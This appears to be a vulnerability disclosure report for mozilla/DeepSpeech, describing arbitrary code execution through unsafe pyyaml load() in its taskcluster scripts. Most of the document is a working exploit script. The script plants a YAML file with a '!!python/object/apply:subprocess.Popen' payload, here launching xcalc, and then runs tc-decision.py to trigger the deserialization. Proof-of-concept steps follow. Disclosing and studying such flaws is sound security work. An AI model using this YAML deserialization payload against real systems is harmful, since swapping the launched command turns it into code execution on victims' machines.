# Description
**Arbitrary Code Excecution** in mozilla/DeepSpeech.DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.
# Technical Description
This package was vulnerable to Arbitrary code execution due to a use of a known vulnerable function **load()** in **pyyaml**
# Exploit code
```python
import os

env = ['GITHUB_HEAD_BRANCH', 'GITHUB_HEAD_REPO_URL', 'GITHUB_HEAD_SHA', 'GITHUB_HEAD_USER', 'GITHUB_HEAD_USER_LOGIN', 'TASK_ID']

for x in env:
    if "USER" in x:
        env = "mozilla"
    elif "LOGIN" in x:
        env = "mozilla"
    elif "TASK_ID" in x:
        env = "137"
    else:
        env = ""
    os.environ[x] = env

#os.system("git clone https://github.com/mozilla/DeepSpeech.git")
os.chdir("DeepSpeech/taskcluster")
os.system("mkdir temp/")
os.system("mv *.yml *.cyml *.tyml temp/")

exploit_yaml = """build:
  metadata:
    name: "DeepSpeech Android ARM64 debug"
    description: "Building DeepSpeech for Android ARM64, debug version"

  template_file: extent_exploit.yml
"""

open("exploit.yml", "w+").write(exploit_yaml)

# data = b"""!!python/object/apply:subprocess.Popen
# - ls"""
extent_yaml = """!!python/object/apply:subprocess.Popen
- ['xcalc']
"""

# extent_yaml = """!!python/object/apply:time.sleep [10]"""

open("extent_exploit.yml", "w+").write(extent_yaml)

# os.system("python -m pip install json-e")
# os.system("python -m pip install slugid")
# os.system("python -m pip install networkx")

os.system("python tc-decision.py --dry")
```
# POC
* Run the exploit code 
* downgrade pyyaml to version 3.12

![](https://cdn.discordapp.com/attachments/749019614352244777/781965199920857088/deepspeech_ace.gif)
